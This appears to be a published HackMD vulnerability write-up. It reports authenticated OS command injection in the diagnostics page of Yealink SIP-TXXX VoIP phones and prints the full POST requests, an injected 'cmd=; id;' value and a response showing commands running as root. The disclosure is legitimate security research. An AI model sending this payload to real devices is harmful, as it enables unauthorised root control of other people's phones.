<!DOCTYPE html>
<html lang="en-US" data-themeable="true">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="dhk51wVg-ulGAxxcJzoo4Zg-UOMmeFdIClXk">
    
    
    <meta name="description" content="Do you love hacking Phones? well of course VOIP phones , this should be worth a read!">
    
    <title>Authenticated OS Command injection Yealink SIP-TXXX - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = 'HgADnNlrSr60HlA64ptfGA'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = false
  window.FOLDER_ENABLE = false
  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = [["048e57c8-0601-4393-b290-d137eaec53fe",682,1,1636568156647,1687764810586],["3d0c21cd-230a-43e2-83df-38c78d970d33",682,1,1637349590465,1687764810586],["7e9009a2-63e4-49b7-bf8c-ed5528d1d55e",-1,-1,1695503623562,1695503623562]]
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Miles%22%7D'
  

  
  window.VERSION_TIME = '1687764811752'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = true
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.COMMENT_ENABLED = true
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    





    <meta property="fb:app_id" content="1436904003272070">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="Authenticated OS Command injection Yealink SIP-TXXX - HackMD">


<meta name="twitter:site" content="@hackmdio" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Authenticated OS Command injection Yealink SIP-TXXX - HackMD" />


    <meta name="twitter:description" content="Do you love hacking Phones? well of course VOIP phones , this should be worth a read!" />



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="Authenticated OS Command injection Yealink SIP-TXXX - HackMD">


<meta property="og:site_name" content="HackMD" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Authenticated OS Command injection Yealink SIP-TXXX - HackMD" />


    <meta property="og:description" content="Do you love hacking Phones? well of course VOIP phones , this should be worth a read!" />



    <link rel="canonical" href="https://hackmd.io/@tahaafarooq/auth_rce_voip" />
    <meta property="og:url" content="https://hackmd.io/@tahaafarooq/auth_rce_voip" />
    <meta property="twitter:url" content="https://hackmd.io/@tahaafarooq/auth_rce_voip" />


     <link href="https://assets.hackmd.io/build/font-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.0a08ae20e14fefe857eb.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.db0e7b64c54d0a77290f.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.6a9dbf5ee8c33a9aadd0.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script defer data-domain="hackmd.io" src="https://plausible.io/js/script.js"></script>
<script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function isLocal () {
    return /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(location.hostname) || location.protocol === 'file:'
  }

  function isAutomation () {
    return Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
  }

  function shouldIgnore () {
    return isLocal() ||
      isAutomation() ||
      window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"Tahaa%20Farooq","path":"tahaafarooq","avatarUrl":"https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F49201347%3Fs%3D96","description":"%E3%81%8A%E5%89%8D%E3%81%AF%E3%82%82%E3%81%86%E6%AD%BB%E3%82%93%E3%81%A7%E3%81%84%E3%82%8B"},"isPublished":true,"createTime":1636552693699,"updateTime":1687764811752,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":2,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":true,"viewCount":3274,"markdown":"Do%20you%20love%20hacking%20Phones%3F%20well%20of%20course%20VOIP%20phones%20%2C%20this%20should%20be%20worth%20a%20read!%0A%0AJust%20unconvered%20a%20vulnerability%20that%20existed%20in%20Yealink%20SIP-TXXX%2C%20This%20vulnerability%20leads%20to%20RCE%20%2C%20but%20it's%20Authenticated%20meaning%20you%20must%20be%20logged%20in%20to%20the%20web%20interface!%0A%0A---%0A%0A%23%23%23%23%20Proof%20Of%20Concept%0A%0AAfter%20logging%20in%20to%20the%20web%20interface%20which%20by%20any%20chance%20can%20be%20port%2080%20or%20port%20443%20%2C%20there%20is%20a%20%60Network%60%20tab%20clicking%20on%20it%20%2C%20there%20are%205%20sections%20%60Basic%60%2C%60PC%20Port%60%2C%60NAT%60%2C%60Advanced%60%2Cand%20%60Diagnostics%60%2C%20Clicking%20on%20%60Diagnostics%60%3A%0A%0A!%5B%5D(https%3A%2F%2Fi.imgur.com%2FkjhoJFx.jpg)%0A%0A%0Aand%20there%20we%20can%20%60ping%60%20or%20perform%20%60traceroute%60%20command%20upon%20an%20IP%20address%20%2C%20capturing%20that%20request%20with%20burpsuite%20will%20reveal%20how%20the%20whole%20thing%20should%20look%20and%20how%20the%20parameters%20are%20sent%20with%20their%20values%3B%0A%0A!%5B%5D(https%3A%2F%2Fi.imgur.com%2FXxRbgeK.jpg)%0A%0A%60%60%60text%0APOST%20%2Fservlet%3Fm%3Dmod_data%26p%3Dnetwork-diagnosis%26q%3Ddocmd%26Rajax%3D0.890925468511929%20HTTP%2F1.1%0AHost%3A%20xxx.xxx.xxx.xxx%0AContent-Length%3A%2049%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F90.0.4430.93%20Safari%2F537.36%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AAccept%3A%20*%2F*%0AOrigin%3A%20http%3A%2F%2Fxxx.xxx.xxx.xxx%0AReferer%3A%20http%3A%2F%2Fxxx.xxx.xxx.xxx%2Fservlet%3Fm%3Dmod_data%26p%3Dnetwork-diagnosis%26q%3Dload%0AAccept-Encoding%3A%20gzip%2C%20deflate%0AAccept-Language%3A%20en-US%2Cen%3Bq%3D0.9%0ACookie%3A%20JSESSIONID%3D9a83d24461329a130%0AConnection%3A%20close%0A%0Acmd%3Dstart%20ping%20127.0.0.1%26token%3D1714636915c6acea98%0A%60%60%60%0A%0Aso%20the%20parameter%20%60cmd%60%20takes%20the%20value%20%60start%60%20then%20the%20command%20to%20execute%20%60ping%20127.0.0.1%60%2C%20so%20I%20thought%20of%20it%20as%20an%20easy%20win%20%2C%20where%20as%20I%20changed%20the%20value%20of%20the%20parameter%20%60cmd%60%20to%20take%20another%20value%20to%20execute%20instead%20of%20%60ping%60%20by%20an%20easy%20basic%20linux%20command%3A%0A%0A%60%60%60text%0Acmd%3D%3B%20id%3B%26token%3D1714636915c6acea98%0A%60%60%60%0A%0Aand%20now%20it%20will%20execute%20%60id%60%20command%20instead!%0A%0A!%5B%5D(https%3A%2F%2Fi.imgur.com%2F1K50Yji.jpg)%0A%0A**POST%20REQUEST**%0A%0A%60%60%60text%0APOST%20%2Fservlet%3Fm%3Dmod_data%26p%3Dnetwork-diagnosis%26q%3Ddocmd%26Rajax%3D0.6597899560162612%20HTTP%2F1.1%0AHost%3A%20xxx.xxx.xxx.xxx%0AContent-Length%3A%2033%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F90.0.4430.93%20Safari%2F537.36%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AAccept%3A%20*%2F*%0AOrigin%3A%20http%3A%2F%2Fxxx.xxx.xxx.xxx%0AReferer%3A%20http%3A%2F%2Fxxx.xxx.xxx.xxx%2Fservlet%3Fm%3Dmod_data%26p%3Dnetwork-diagnosis%26q%3Dload%0AAccept-Encoding%3A%20gzip%2C%20deflate%0AAccept-Language%3A%20en-US%2Cen%3Bq%3D0.9%0ACookie%3A%20JSESSIONID%3D9a83d2446809c4f88%0AConnection%3A%20close%0A%0Acmd%3D%3B%20id%26token%3D1957747793cee22738%0A%60%60%60%0A%0A**RESPONSE**%0A%60%60%60%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AConnection%3A%20close%0ADate%3A%20Wed%2C%2010%20Nov%202021%2014%3A20%3A23%20GMT%0AServer%3A%20embed%20httpd%0AContent-Length%3A%2082%0A%0A%3Chtml%3E%0A%3Cbody%3E%0A%09%3Cdiv%20id%3D%22_RES_INFO_%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20uid%3D0(root)%20gid%3D0(root)%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E%0A%60%60%60%0A%0AAnd%20there%20we%20have%20RCE!%20%3A100%3A%20%0A%0AContact%20%3A%20Twitter%3A%20%5Btahaafarooq%5D(https%3A%2F%2Ftwitter.com%2Ftahaafarooq)%2C%20Telegram%20%3A%20%5Btahaafarooq%5D(https%3A%2F%2Ft.me%2Ftahaafarooq)","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":3,"isNotesRecommendationsEnabled":true,"recommendedNotes":[{"id":"13364cb9-8813-43c2-b728-7ece9f79bdb4","title":"Introduction%20To%20CryptoHack%20-%20Writeup","brief":"This%20starter%20course%20gets%20you%20up%20and%20running%20with%20CryptoHack.%20You%26%2339%3Bll%20learn%20to%20encode%20and%20decode%20data%20types%20that%20are%20commonly%20used%20in%20cryptography.%20Then%20you%26%2339%3Bll%20get%20comfortable%20with%20the%20XOR%20operation%20which%20is%20at%20the%20centre%20of%20symmetric%20cryptography.%20Finally%2C%20the%20course%20ends%20with%20some%20fun%20XOR%20puzzles%20to%20test%20what%20you%26%2339%3Bve%20learned.","lastchangeAt":"2024-11-07T01%3A16%3A28.326Z","publishLink":"%40tahaafarooq%2Fintroduction-to-cryptohack-writeup"},{"id":"0e59f42d-583a-4c0f-8de2-fc12bf91a6cc","title":"An%20Operative%20Guide%20To%20Pentesting%20The%20MySQL%20Service","brief":"In%20this%20article%2C%20I%20will%20be%20writing%20about%20how%20you%2C%20as%20a%20penetration%20tester%2C%20can%20leverage%20access%20to%20a%20MySQL%20service%20to%20gain%20complete%20access%20to%20the%20server%2C%20read%20files%20from%20the%20server%2C%20and%20write%20files%20to%20the%20server.%20This%20is%20achieved%20by%20identifying%20common%20misconfigurations%20and%20settings%20and%20exploiting%20them%20to%20achieve%20the%20intended%20goal.%0A","lastchangeAt":"2024-09-11T03%3A23%3A57.909Z","publishLink":"%40tahaafarooq%2Fguide-to-pentest-mysql"},{"id":"3bf429e2-edb7-495d-a141-dd736679e788","title":"Reverse%20Engineering%20Solar-PuTTY%204.0.0.47","brief":"Uploading%20file..._czud40xt5","lastchangeAt":"2024-08-13T22%3A46%3A14.726Z","publishLink":"%40tahaafarooq%2Fcracking-solar-putty"},{"id":"61fb4860-6325-496b-beae-cc80c0065303","title":"CyberChampions%20Tz%202022%2F2023%20TCRA%20WRITEUPS","brief":"This%20writeup%20contains%20the%20challenges%20that%20were%20hosted%20on%20finals%20and%20were%20categorized%20in%20Reverse%20Engineering%2C%20Cryptography%2C%20Misc%2C%20and%20Web.","lastchangeAt":"2024-08-05T23%3A10%3A03.509Z","publishLink":"%40tahaafarooq%2Fcyberchampions-22-23-reverse"}],"lastChangeUserInfo":{"name":"Tahaa%20Farooq","path":"tahaafarooq","avatarUrl":"https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F49201347%3Fs%3D96"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="https://tally.so/widgets/embed.js"></script>

    
</head>

<body style="display:none;">
    <div id="toasts-container" class="toasts-container z-[2000]"></div>
    <div id="publish-page">Do you love hacking Phones? well of course VOIP phones , this should be worth a read!

Just unconvered a vulnerability that existed in Yealink SIP-TXXX, This vulnerability leads to RCE , but it&#39;s Authenticated meaning you must be logged in to the web interface!

---

#### Proof Of Concept

After logging in to the web interface which by any chance can be port 80 or port 443 , there is a `Network` tab clicking on it , there are 5 sections `Basic`,`PC Port`,`NAT`,`Advanced`,and `Diagnostics`, Clicking on `Diagnostics`:

![](https://i.imgur.com/kjhoJFx.jpg)


and there we can `ping` or perform `traceroute` command upon an IP address , capturing that request with burpsuite will reveal how the whole thing should look and how the parameters are sent with their values;

![](https://i.imgur.com/XxRbgeK.jpg)

```text
POST /servlet?m=mod_data&amp;p=network-diagnosis&amp;q=docmd&amp;Rajax=0.890925468511929 HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 49
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://xxx.xxx.xxx.xxx
Referer: http://xxx.xxx.xxx.xxx/servlet?m=mod_data&amp;p=network-diagnosis&amp;q=load
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=9a83d24461329a130
Connection: close

cmd=start ping 127.0.0.1&amp;token=1714636915c6acea98
```

so the parameter `cmd` takes the value `start` then the command to execute `ping 127.0.0.1`, so I thought of it as an easy win , where as I changed the value of the parameter `cmd` to take another value to execute instead of `ping` by an easy basic linux command:

```text
cmd=; id;&amp;token=1714636915c6acea98
```

and now it will execute `id` command instead!

![](https://i.imgur.com/1K50Yji.jpg)

**POST REQUEST**

```text
POST /servlet?m=mod_data&amp;p=network-diagnosis&amp;q=docmd&amp;Rajax=0.6597899560162612 HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 33
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://xxx.xxx.xxx.xxx
Referer: http://xxx.xxx.xxx.xxx/servlet?m=mod_data&amp;p=network-diagnosis&amp;q=load
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=9a83d2446809c4f88
Connection: close

cmd=; id&amp;token=1957747793cee22738
```

**RESPONSE**
```
HTTP/1.1 200 OK
Content-Type: text/html
Connection: close
Date: Wed, 10 Nov 2021 14:20:23 GMT
Server: embed httpd
Content-Length: 82

&lt;html&gt;
&lt;body&gt;
	&lt;div id=&#34;_RES_INFO_&#34;&gt;
            uid=0(root) gid=0(root)
        &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

And there we have RCE! :100: 

Contact : Twitter: [tahaafarooq](https://twitter.com/tahaafarooq), Telegram : [tahaafarooq](https://t.me/tahaafarooq)</div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="dhk51wVg-ulGAxxcJzoo4Zg-UOMmeFdIClXk"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div
            hidden
            id="hmd-captcha"
            data-provider=""
            data-captcha-data=""
            class="flex justify-center"
        ></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="https://accounts.google.com/gsi/client" async defer nonce="93843244-652c-450b-a34d-3a20b1d6aafe"></script>
<script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="#" class="bg-white btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="https://hackmd.io/images/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div >
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
    <script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
<script nonce="93843244-652c-450b-a34d-3a20b1d6aafe">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="https://hackmd.io/api/i18n.js"></script>
     <script src="https://assets.hackmd.io/build/font-vendor.eaa8dd82d4e056021b8c.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.04da453a2a68f624f4d4.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.94ca39727118897623cd.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.e537850a918313f6b528.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.baf5557a77cb8d651e58.js" defer="defer"></script>

    

</body>
</html>
